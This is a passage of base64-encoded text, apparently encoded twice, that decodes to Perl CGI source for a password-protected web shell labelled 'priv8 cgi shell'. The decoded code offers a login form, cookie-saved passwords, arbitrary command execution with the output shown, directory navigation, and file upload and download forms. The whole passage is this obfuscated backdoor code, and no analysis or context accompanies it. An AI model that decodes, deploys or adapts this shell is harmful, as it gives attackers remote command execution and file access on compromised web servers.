ROQ2cwS1ZISjVhVzVuSUNSVFpYSjJaWEpPWVcxbExpNHVQR0p5UGcwS1EyOXVibVZqZEdWa0lIUnZJQ1JUClpYSjJaWEpPWVcxbFBHSnlQZzBLUlhOallYQmxJR05vWVhKaFkzUmxjaUJwY3lCZVhRMEtQR052WkdVK0pFMWxjM05oWjJVTkNrVk8KUkEwS2ZRMEtEUW9qTFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdApMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0RFFvaklGQnlhVzUwY3lCMGFHVWdiV1Z6YzJGblpTQjBhR0YwCklHbHVabTl5YlhNZ2RHaGxJSFZ6WlhJZ2IyWWdZU0JtWVdsc1pXUWdiRzluYVc0TkNpTXRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHQKTFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdApMUzBOQ25OMVlpQlFjbWx1ZEV4dloybHVSbUZwYkdWa1RXVnpjMkZuWlEwS2V3MEtDWEJ5YVc1MElEdzhSVTVFT3cwS1BHTnZaR1UrCkRRbzhZbkkrYkc5bmFXNDZJR0ZrYldsdVBHSnlQZzBLY0dGemMzZHZjbVE2UEdKeVBnMEtURzluYVc0Z2FXNWpiM0p5WldOMFBHSnkKUGp4aWNqNE5Dand2WTI5a1pUNE5Da1ZPUkEwS2ZRMEtEUW9qTFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdApMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0RFFvaklGQnlhVzUwCmN5QjBhR1VnU0ZSTlRDQm1iM0p0SUdadmNpQnNiMmRuYVc1bklHbHVEUW9qTFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHQKTFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0RFFwegpkV0lnVUhKcGJuUk1iMmRwYmtadmNtME5DbnNOQ2dsd2NtbHVkQ0E4UEVWT1JEc05DanhqYjJSbFBnMEtEUW84Wm05eWJTQnVZVzFsClBTSm1JaUJ0WlhSb2IyUTlJbEJQVTFRaUlHRmpkR2x2YmowaUpGTmpjbWx3ZEV4dlkyRjBhVzl1SWo0TkNqeHBibkIxZENCMGVYQmwKUFNKb2FXUmtaVzRpSUc1aGJXVTlJbUVpSUhaaGJIVmxQU0pzYjJkcGJpSStEUW84TDJadmJuUStEUW84Wm05dWRDQnphWHBsUFNJegpJajROQ214dloybHVPaUE4WWlCemRIbHNaVDBpWTI5c2IzSTZZbXhoWTJzN1ltRmphMmR5YjNWdVpDMWpiMnh2Y2pvalptWm1aalkyCklqNXdjbWwyT0NCaloya2djMmhsYkd3OEwySStQR0p5UGcwS2NHRnpjM2R2Y21RNlBDOW1iMjUwUGp4bWIyNTBJR052Ykc5eVBTSWoKTURBNU9UQXdJaUJ6YVhwbFBTSXpJajQ4YVc1d2RYUWdkSGx3WlQwaWNHRnpjM2R2Y21RaUlHNWhiV1U5SW5BaVBnMEtQR2x1Y0hWMApJSFI1Y0dVOUluTjFZbTFwZENJZ2RtRnNkV1U5SWtWdWRHVnlJajROQ2p3dlptOXliVDROQ2p3dlkyOWtaVDROQ2tWT1JBMEtmUTBLCkRRb2pMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHQKTFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHREUW9qSUZCeWFXNTBjeUIwYUdVZ1ptOXZkR1Z5SUdadmNpQjBhR1VnU0ZSTgpUQ0JRWVdkbERRb2pMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0CkxTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHREUXB6ZFdJZ1VISnBiblJRWVdkbFJtOXZkR1Z5RFFwN0RRb0oKY0hKcGJuUWdJand2Wm05dWRENDhMMkp2WkhrK1BDOW9kRzFzUGlJN0RRcDlEUW9OQ2lNdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdApMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0CkxTME5DaU1nVW1WMGNtVnBkbVZ6SUhSb1pTQjJZV3gxWlhNZ2IyWWdZV3hzSUdOdmIydHBaWE11SUZSb1pTQmpiMjlyYVdWeklHTmgKYmlCaVpTQmhZMk5sYzNObGN5QjFjMmx1WnlCMGFHVU5DaU1nZG1GeWFXRmliR1VnSkVOdmIydHBaWE43SnlkOURRb2pMUzB0TFMwdApMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0CkxTMHRMUzB0TFMwdExTMHRMUzB0RFFwemRXSWdSMlYwUTI5dmEybGxjdzBLZXcwS0NVQm9kSFJ3WTI5dmEybGxjeUE5SUhOd2JHbDAKS0M4N0lDOHNKRVZPVm5zblNGUlVVRjlEVDA5TFNVVW5mU2s3RFFvSlptOXlaV0ZqYUNBa1kyOXZhMmxsS0VCb2RIUndZMjl2YTJsbApjeWtOQ2dsN0RRb0pDU2drYVdRc0lDUjJZV3dwSUQwZ2MzQnNhWFFvTHowdkxDQWtZMjl2YTJsbEtUc05DZ2tKSkVOdmIydHBaWE43CkpHbGtmU0E5SUNSMllXdzdEUW9KZlEwS2ZRMEtEUW9qTFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHQKTFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0RFFvaklGQnlhVzUwY3lCMAphR1VnYzJOeVpXVnVJSGRvWlc0Z2RHaGxJSFZ6WlhJZ2JHOW5jeUJ2ZFhRTkNpTXRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0CkxTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTME4KQ25OMVlpQlFjbWx1ZEV4dloyOTFkRk5qY21WbGJnMEtldzBLQ1hCeWFXNTBJQ0k4WTI5a1pUNURiMjV1WldOMGFXOXVJR05zYjNObApaQ0JpZVNCbWIzSmxhV2R1SUdodmMzUXVQR0p5UGp4aWNqNDhMMk52WkdVK0lqc05DbjBOQ2cwS0l5MHRMUzB0TFMwdExTMHRMUzB0CkxTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHQKTFMwdExTMHRMUTBLSXlCTWIyZHpJRzkxZENCMGFHVWdkWE5sY2lCaGJtUWdZV3hzYjNkeklIUm9aU0IxYzJWeUlIUnZJR3h2WjJsdQpJR0ZuWVdsdURRb2pMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0CkxTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHREUXB6ZFdJZ1VHVnlabTl5YlV4dloyOTFkQTBLZXcwS0NYQnkKYVc1MElDSlRaWFF0UTI5dmEybGxPaUJUUVZaRlJGQlhSRDA3WEc0aU95QWpJSEpsYlc5MlpTQndZWE56ZDI5eVpDQmpiMjlyYVdVTgpDZ2ttVUhKcGJuUlFZV2RsU0dWaFpHVnlLQ0p3SWlrN0RRb0pKbEJ5YVc1MFRHOW5iM1YwVTJOeVpXVnVPdzBLRFFvSkpsQnlhVzUwClRHOW5hVzVUWTNKbFpXNDdEUW9KSmxCeWFXNTBURzluYVc1R2IzSnRPdzBLQ1NaUWNtbHVkRkJoWjJWR2IyOTBaWEk3RFFwOURRb04KQ2lNdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdApMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwTkNpTWdWR2hwY3lCbWRXNWpkR2x2YmlCcGN5QmpZV3hzWldRZ2RHOGdiRzluCmFXNGdkR2hsSUhWelpYSXVJRWxtSUhSb1pTQndZWE56ZDI5eVpDQnRZWFJqYUdWekxDQnBkQTBLSXlCa2FYTndiR0Y1Y3lCaElIQmgKWjJVZ2RHaGhkQ0JoYkd4dmQzTWdkR2hsSUhWelpYSWdkRzhnY25WdUlHTnZiVzFoYm1SekxpQkpaaUIwYUdVZ2NHRnpjM2R2Y21RZwpaRzlsYm5NbmRBMEtJeUJ0WVhSamFDQnZjaUJwWmlCdWJ5QndZWE56ZDI5eVpDQnBjeUJsYm5SbGNtVmtMQ0JwZENCa2FYTndiR0Y1CmN5QmhJR1p2Y20wZ2RHaGhkQ0JoYkd4dmQzTWdkR2hsSUhWelpYSU5DaU1nZEc4Z2JHOW5hVzROQ2lNdExTMHRMUzB0TFMwdExTMHQKTFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdApMUzB0TFMwdExTME5Dbk4xWWlCUVpYSm1iM0p0VEc5bmFXNGdEUXA3RFFvSmFXWW9KRXh2WjJsdVVHRnpjM2R2Y21RZ1pYRWdKRkJoCmMzTjNiM0prS1NBaklIQmhjM04zYjNKa0lHMWhkR05vWldRTkNnbDdEUW9KQ1hCeWFXNTBJQ0pUWlhRdFEyOXZhMmxsT2lCVFFWWkYKUkZCWFJEMGtURzluYVc1UVlYTnpkMjl5WkR0Y2JpSTdEUW9KQ1NaUWNtbHVkRkJoWjJWSVpXRmtaWElvSW1NaUtUc05DZ2tKSmxCeQphVzUwUTI5dGJXRnVaRXhwYm1WSmJuQjFkRVp2Y20wN0RRb0pDU1pRY21sdWRGQmhaMlZHYjI5MFpYSTdEUW9KZlEwS0NXVnNjMlVnCkl5QndZWE56ZDI5eVpDQmthV1J1SjNRZ2JXRjBZMmdOQ2dsN0RRb0pDU1pRY21sdWRGQmhaMlZJWldGa1pYSW9JbkFpS1RzTkNna0oKSmxCeWFXNTBURzluYVc1VFkzSmxaVzQ3RFFvSkNXbG1LQ1JNYjJkcGJsQmhjM04zYjNKa0lHNWxJQ0lpS1NBaklITnZiV1VnY0dGegpjM2R2Y21RZ2QyRnpJR1Z1ZEdWeVpXUU5DZ2tKZXcwS0NRa0pKbEJ5YVc1MFRHOW5hVzVHWVdsc1pXUk5aWE56WVdkbE93MEtEUW9KCkNYME5DZ2tKSmxCeWFXNTBURzluYVc1R2IzSnRPdzBLQ1FrbVVISnBiblJRWVdkbFJtOXZkR1Z5T3cwS0NYME5DbjBOQ2cwS0l5MHQKTFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdApMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUTBLSXlCUWNtbHVkSE1nZEdobElFaFVUVXdnWm05eWJTQjBhR0YwSUdGc2JHOTNjeUIwCmFHVWdkWE5sY2lCMGJ5QmxiblJsY2lCamIyMXRZVzVrY3cwS0l5MHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHQKTFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExRMEtjM1ZpSUZCeQphVzUwUTI5dGJXRnVaRXhwYm1WSmJuQjFkRVp2Y20wTkNuc05DZ2trVUhKdmJYQjBJRDBnSkZkcGJrNVVJRDhnSWlSRGRYSnlaVzUwClJHbHlQaUFpSURvZ0lsdGhaRzFwYmx4QUpGTmxjblpsY2s1aGJXVWdKRU4xY25KbGJuUkVhWEpkWENRZ0lqc05DZ2x3Y21sdWRDQTgKUEVWT1JEc05DanhqYjJSbFBnMEtQR1p2Y20wZ2JtRnRaVDBpWmlJZ2JXVjBhRzlrUFNKUVQxTlVJaUJoWTNScGIyNDlJaVJUWTNKcApjSFJNYjJOaGRHbHZiaUkrRFFvOGFXNXdkWFFnZEhsd1pUMGlhR2xrWkdWdUlpQnVZVzFsUFNKaElpQjJZV3gxWlQwaVkyOXRiV0Z1ClpDSStEUW84YVc1d2RYUWdkSGx3WlQwaWFHbGtaR1Z1SWlCdVlXMWxQU0prSWlCMllXeDFaVDBpSkVOMWNuSmxiblJFYVhJaVBnMEsKSkZCeWIyMXdkQTBLUEdsdWNIVjBJSFI1Y0dVOUluUmxlSFFpSUc1aGJXVTlJbU1pUGcwS1BHbHVjSFYwSUhSNWNHVTlJbk4xWW0xcApkQ0lnZG1Gc2RXVTlJa1Z1ZEdWeUlqNE5Dand2Wm05eWJUNE5Dand2WTI5a1pUNE5DZzBLUlU1RURRcDlEUW9OQ2lNdExTMHRMUzB0CkxTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHQKTFMwdExTMHRMUzB0TFMwdExTME5DaU1nVUhKcGJuUnpJSFJvWlNCSVZFMU1JR1p2Y20wZ2RHaGhkQ0JoYkd4dmQzTWdkR2hsSUhWegpaWElnZEc4Z1pHOTNibXh2WVdRZ1ptbHNaWE1OQ2lNdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0CkxTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwTkNuTjFZaUJRY21sdWRFWnAKYkdWRWIzZHViRzloWkVadmNtME5DbnNOQ2dra1VISnZiWEIwSUQwZ0pGZHBiazVVSUQ4Z0lpUkRkWEp5Wlc1MFJHbHlQaUFpSURvZwpJbHRoWkcxcGJseEFKRk5sY25abGNrNWhiV1VnSkVOMWNuSmxiblJFYVhKZFhDUWdJanNOQ2dsd2NtbHVkQ0E4UEVWT1JEc05DanhqCmIyUmxQZzBLUEdadmNtMGdibUZ0WlQwaVppSWdiV1YwYUc5a1BTSlFUMU5VSWlCaFkzUnBiMjQ5SWlSVFkzSnBjSFJNYjJOaGRHbHYKYmlJK0RRbzhhVzV3ZFhRZ2RIbHdaVDBpYUdsa1pHVnVJaUJ1WVcxbFBTSmtJaUIyWVd4MVpUMGlKRU4xY25KbGJuUkVhWElpUGcwSwpQR2x1Y0hWMElIUjVjR1U5SW1ocFpHUmxiaUlnYm1GdFpUMGlZU0lnZG1Gc2RXVTlJbVJ2ZDI1c2IyRmtJajROQ2lSUWNtOXRjSFFnClpHOTNibXh2WVdROFluSStQR0p5UGcwS1JtbHNaVzVoYldVNklEeHBibkIxZENCMGVYQmxQU0owWlhoMElpQnVZVzFsUFNKbUlpQnoKYVhwbFBTSXpOU0krUEdKeVBqeGljajROQ2tSdmQyNXNiMkZrT2lBOGFXNXdkWFFnZEhsd1pUMGljM1ZpYldsMElpQjJZV3gxWlQwaQpRbVZuYVc0aVBnMEtQQzltYjNKdFBnMEtQQzlqYjJSbFBnMEtSVTVFRFFwOURRb05DaU10TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0CkxTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHQKTFMwTkNpTWdVSEpwYm5SeklIUm9aU0JJVkUxTUlHWnZjbTBnZEdoaGRDQmhiR3h2ZDNNZ2RHaGxJSFZ6WlhJZ2RHOGdkWEJzYjJGawpJR1pwYkdWekRRb2pMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0CkxTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHREUXB6ZFdJZ1VISnBiblJHYVd4bFZYQnNiMkZrUm05eWJRMEsKZXcwS0NTUlFjbTl0Y0hRZ1BTQWtWMmx1VGxRZ1B5QWlKRU4xY25KbGJuUkVhWEkrSUNJZ09pQWlXMkZrYldsdVhFQWtVMlZ5ZG1WeQpUbUZ0WlNBa1EzVnljbVZ1ZEVScGNsMWNKQ0FpT3cwS0NYQnlhVzUwSUR3OFJVNUVPdzBLUEdOdlpHVStEUW9OQ2p4bWIzSnRJRzVoCmJXVTlJbVlpSUdWdVkzUjVjR1U5SW0xMWJIUnBjR0Z5ZEM5bWIzSnRMV1JoZEdFaUlHMWxkR2h2WkQwaVVFOVRWQ0lnWVdOMGFXOXUKUFNJa1UyTnlhWEIwVEc5allYUnBiMjRpUGcwS0pGQnliMjF3ZENCMWNHeHZZV1E4WW5JK1BHSnlQZzBLUm1sc1pXNWhiV1U2SUR4cApibkIxZENCMGVYQmxQU0ptYVd4bElpQnVZVzFsUFNKbUlpQnphWHBsUFNJek5TSStQR0p5UGp4aWNqNE5Dazl3ZEdsdmJuTTZJQ1p1ClluTndPenhwYm5CMWRDQjBlWEJsUFNKamFHVmphMkp2ZUNJZ2JtRnRaVDBpYnlJZ2RtRnNkV1U5SW05MlpYSjNjbWwwWlNJK0RRcFAKZG1WeWQzSnBkR1VnYVdZZ2FYUWdSWGhwYzNSelBHSnlQanhpY2o0TkNsVndiRzloWkRvbWJtSnpjRHNtYm1KemNEc21ibUp6Y0RzOAphVzV3ZFhRZ2RIbHdaVDBpYzNWaWJXbDBJaUIyWVd4MVpUMGlRbVZuYVc0aVBnMEtQR2x1Y0hWMElIUjVjR1U5SW1ocFpHUmxiaUlnCmJtRnRaVDBpWkNJZ2RtRnNkV1U5SWlSRGRYSnlaVzUwUkdseUlqNE5DanhwYm5CMWRDQjBlWEJsUFNKb2FXUmtaVzRpSUc1aGJXVTkKSW1FaUlIWmhiSFZsUFNKMWNHeHZZV1FpUGcwS1BDOW1iM0p0UGcwS1BDOWpiMlJsUGcwS1JVNUVEUXA5RFFvTkNpTXRMUzB0TFMwdApMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0CkxTMHRMUzB0TFMwdExTMHRMUzBOQ2lNZ1ZHaHBjeUJtZFc1amRHbHZiaUJwY3lCallXeHNaV1FnZDJobGJpQjBhR1VnZEdsdFpXOTEKZENCbWIzSWdZU0JqYjIxdFlXNWtJR1Y0Y0dseVpYTXVJRmRsSUc1bFpXUWdkRzhOQ2lNZ2RHVnliV2x1WVhSbElIUm9aU0J6WTNKcApjSFFnYVcxdFpXUnBZWFJsYkhrdUlGUm9hWE1nWm5WdVkzUnBiMjRnYVhNZ2RtRnNhV1FnYjI1c2VTQnZiaUJWYm1sNExpQkpkQ0JwCmN3MEtJeUJ1WlhabGNpQmpZV3hzWldRZ2QyaGxiaUIwYUdVZ2MyTnlhWEIwSUdseklISjFibTVwYm1jZ2IyNGdUbFF1RFFvakxTMHQKTFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdApMUzB0TFMwdExTMHRMUzB0TFMwdExTMHREUXB6ZFdJZ1EyOXRiV0Z1WkZScGJXVnZkWFFOQ25zTkNnbHBaaWdoSkZkcGJrNVVLUTBLCkNYc05DZ2tKWVd4aGNtMG9NQ2s3RFFvSkNYQnlhVzUwSUR3OFJVNUVPdzBLUEM5NGJYQStEUW9OQ2p4amIyUmxQZzBLUTI5dGJXRnUKWkNCbGVHTmxaV1JsWkNCdFlYaHBiWFZ0SUhScGJXVWdiMllnSkVOdmJXMWhibVJVYVcxbGIzVjBSSFZ5WVhScGIyNGdjMlZqYjI1awpLSE1wTGcwS1BHSnlQa3RwYkd4bFpDQnBkQ0VOQ2tWT1JBMEtDUWttVUhKcGJuUkRiMjF0WVc1a1RHbHVaVWx1Y0hWMFJtOXliVHNOCkNna0pKbEJ5YVc1MFVHRm5aVVp2YjNSbGNqc05DZ2tKWlhocGREc05DZ2w5RFFwOURRb05DaU10TFMwdExTMHRMUzB0TFMwdExTMHQKTFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdApMUzB0TFMwTkNpTWdWR2hwY3lCbWRXNWpkR2x2YmlCcGN5QmpZV3hzWldRZ2RHOGdaWGhsWTNWMFpTQmpiMjF0WVc1a2N5NGdTWFFnClpHbHpjR3hoZVhNZ2RHaGxJRzkxZEhCMWRDQnZaaUIwYUdVTkNpTWdZMjl0YldGdVpDQmhibVFnWVd4c2IzZHpJSFJvWlNCMWMyVnkKSUhSdklHVnVkR1Z5SUdGdWIzUm9aWElnWTI5dGJXRnVaQzRnVkdobElHTm9ZVzVuWlNCa2FYSmxZM1J2Y25rTkNpTWdZMjl0YldGdQpaQ0JwY3lCb1lXNWtiR1ZrSUdScFptWmxjbVZ1ZEd4NUxpQkpiaUIwYUdseklHTmhjMlVzSUhSb1pTQnVaWGNnWkdseVpXTjBiM0o1CklHbHpJSE4wYjNKbFpDQnBiZzBLSXlCaGJpQnBiblJsY201aGJDQjJZWEpwWVdKc1pTQmhibVFnYVhNZ2RYTmxaQ0JsWVdOb0lIUnAKYldVZ1lTQmpiMjF0WVc1a0lHaGhjeUIwYnlCaVpTQmxlR1ZqZFhSbFpDNGdWR2hsRFFvaklHOTFkSEIxZENCdlppQjBhR1VnWTJoaApibWRsSUdScGNtVmpkRzl5ZVNCamIyMXRZVzVrSUdseklHNXZkQ0JrYVhOd2JHRjVaV1FnZEc4Z2RHaGxJSFZ6WlhKekRRb2pJSFJvClpYSmxabTl5WlNCbGNuSnZjaUJ0WlhOellXZGxjeUJqWVc1dWIzUWdZbVVnWkdsemNHeGhlV1ZrTGcwS0l5MHRMUzB0TFMwdExTMHQKTFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdApMUzB0TFMwdExTMHRMUTBLYzNWaUlFVjRaV04xZEdWRGIyMXRZVzVrRFFwN0RRb0phV1lvSkZKMWJrTnZiVzFoYm1RZ1BYNGdiUzllClhITXFZMlJjY3lzb0xpc3BMeWtnSXlCcGRDQnBjeUJoSUdOb1lXNW5aU0JrYVhJZ1kyOXRiV0Z1WkEwS0NYc05DZ2tKSXlCM1pTQmoKYUdGdVoyVWdkR2hsSUdScGNtVmpkRzl5ZVNCcGJuUmxjbTVoYkd4NUxpQlVhR1VnYjNWMGNIVjBJRzltSUhSb1pRMEtDUWtqSUdOdgpiVzFoYm1RZ2FYTWdibTkwSUdScGMzQnNZWGxsWkM0TkNna0pEUW9KQ1NSUGJHUkVhWElnUFNBa1EzVnljbVZ1ZEVScGNqc05DZ2tKCkpFTnZiVzFoYm1RZ1BTQWlZMlFnWENJa1EzVnljbVZ1ZEVScGNsd2lJaTRrUTIxa1UyVndMaUpqWkNBa01TSXVKRU50WkZObGNDNGsKUTIxa1VIZGtPdzBLQ1FsamFHOXdLQ1JEZFhKeVpXNTBSR2x5SUQwZ1lDUkRiMjF0WVc1a1lDazdEUW9KQ1NaUWNtbHVkRkJoWjJWSQpaV0ZrWlhJb0ltTWlLVHNOQ2drSkpGQnliMjF3ZENBOUlDUlhhVzVPVkNBL0lDSWtUMnhrUkdseVBpQWlJRG9nSWx0aFpHMXBibHhBCkpGTmxjblpsY2s1aGJXVWdKRTlzWkVScGNsMWNKQ0FpT3cwS0NRbHdjbWx1ZENBaUpGQnliMjF3ZENBa1VuVnVRMjl0YldGdVpDSTcKRFFvSmZRMEtDV1ZzYzJVZ0l5QnpiMjFsSUc5MGFHVnlJR052YlcxaGJtUXNJR1JwYzNCc1lYa2dkR2hsSUc5MWRIQjFkQTBLQ1hzTgpDZ2tKSmxCeWFXNTBVR0ZuWlVobFlXUmxjaWdpWXlJcE93MEtDUWtrVUhKdmJYQjBJRDBnSkZkcGJrNVVJRDhnSWlSRGRYSnlaVzUwClJHbHlQaUFpSURvZ0lsdGhaRzFwYmx4QUpGTmxjblpsY2s1aGJXVWdKRU4xY25KbGJuUkVhWEpkWENRZ0lqc05DZ2tKY0hKcGJuUWcKSWlSUWNtOXRjSFFnSkZKMWJrTnZiVzFoYm1ROGVHMXdQaUk3RFFvSkNTUkRiMjF0WVc1a0lEMGdJbU5rSUZ3aUpFTjFjbkpsYm5SRQphWEpjSWlJdUpFTnRaRk5sY0M0a1VuVnVRMjl0YldGdVpDNGtVbVZrYVhKbFkzUnZjanNOQ2drSmFXWW9JU1JYYVc1T1ZDa05DZ2tKCmV3MEtDUWtKSkZOSlIzc25RVXhTVFNkOUlEMGdYQ1pEYjIxdFlXNWtWR2x0Wlc5MWREc05DZ2tKQ1dGc1lYSnRLQ1JEYjIxdFlXNWsKVkdsdFpXOTFkRVIxY21GMGFXOXVLVHNOQ2drSmZRMEtDUWxwWmlna1UyaHZkMFI1Ym1GdGFXTlBkWFJ3ZFhRcElDTWdjMmh2ZHlCdgpkWFJ3ZFhRZ1lYTWdhWFFnYVhNZ1oyVnVaWEpoZEdWa0RRb0pDWHNOQ2drSkNTUjhQVEU3RFFvSkNRa2tRMjl0YldGdVpDQXVQU0FpCklId2lPdzBLQ1FrSmIzQmxiaWhEYjIxdFlXNWtUM1YwY0hWMExDQWtRMjl0YldGdVpDazdEUW9KQ1FsM2FHbHNaU2c4UTI5dGJXRnUKWkU5MWRIQjFkRDRwRFFvSkNRbDdEUW9KQ1FrSkpGOGdQWDRnY3k4b1hHNThYSEpjYmlra0x5ODdEUW9KQ1FrSmNISnBiblFnSWlSZgpYRzRpT3cwS0NRa0pmUTBLQ1FrSkpIdzlNRHNOQ2drSmZRMEtDUWxsYkhObElDTWdjMmh2ZHlCdmRYUndkWFFnWVdaMFpYSWdZMjl0CmJXRnVaQ0JqYjIxd2JHVjBaWE1OQ2drSmV3MEtDUWtKY0hKcGJuUWdZQ1JEYjIxdFlXNWtZRHNOQ2drSmZRMEtDUWxwWmlnaEpGZHAKYms1VUtRMEtDUWw3RFFvSkNRbGhiR0Z5YlNnd0tUc05DZ2tKZlEwS0NRbHdjbWx1ZENBaVBDOTRiWEErSWpzTkNnbDlEUW9KSmxCeQphVzUwUTI5dGJXRnVaRXhwYm1WSmJuQjFkRVp2Y20wN0RRb0pKbEJ5YVc1MFVHRm5aVVp2YjNSbGNqc05DbjBOQ2cwS0l5MHRMUzB0CkxTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHQKTFMwdExTMHRMUzB0TFMwdExTMHRMUTBLSXlCVWFHbHpJR1oxYm1OMGFXOXVJR1JwYzNCc1lYbHpJSFJvWlNCd1lXZGxJSFJvWVhRZwpZMjl1ZEdGcGJuTWdZU0JzYVc1cklIZG9hV05vSUdGc2JHOTNjeUIwYUdVZ2RYTmxjZzBLSXlCMGJ5QmtiM2R1Ykc5aFpDQjBhR1VnCmMzQmxZMmxtYVdWa0lHWnBiR1V1SUZSb1pTQndZV2RsSUdGc2MyOGdZMjl1ZEdGcGJuTWdZU0JoZFhSdkxYSmxabkpsYzJnTkNpTWcKWm1WaGRIVnlaU0IwYUdGMElITjBZWEowY3lCMGFHVWdaRzkzYm14dllXUWdZWFYwYjIxaGRHbGpZV3hzZVM0TkNpTWdRWEpuZFcxbApiblFnTVRvZ1JuVnNiSGtnY1hWaGJHbG1hV1ZrSUdacGJHVnVZVzFsSUc5bUlIUm9aU0JtYVd4bElIUnZJR0psSUdSdmQyNXNiMkZrClpXUU5DaU10TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHQKTFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzBOQ25OMVlpQlFjbWx1ZEVSdmQyNXNiMkZrVEdsdWExQmhaMlVOQ25zTgpDZ2xzYjJOaGJDZ2tSbWxzWlZWeWJDa2dQU0JBWHpzTkNnbHBaaWd0WlNBa1JtbHNaVlZ5YkNrZ0l5QnBaaUIwYUdVZ1ptbHNaU0JsCmVHbHpkSE1OQ2dsN0RRb0pDU01nWlc1amIyUmxJSFJvWlNCbWFXeGxJR3hwYm1zZ2MyOGdkMlVnWTJGdUlITmxibVFnYVhRZ2RHOGcKZEdobElHSnliM2R6WlhJTkNna0pKRVpwYkdWVmNtd2dQWDRnY3k4b1cxNWhMWHBCTFZvd0xUbGRLUzhuSlNjdWRXNXdZV05yS0NKSQpLaUlzSkRFcEwyVm5PdzBLQ1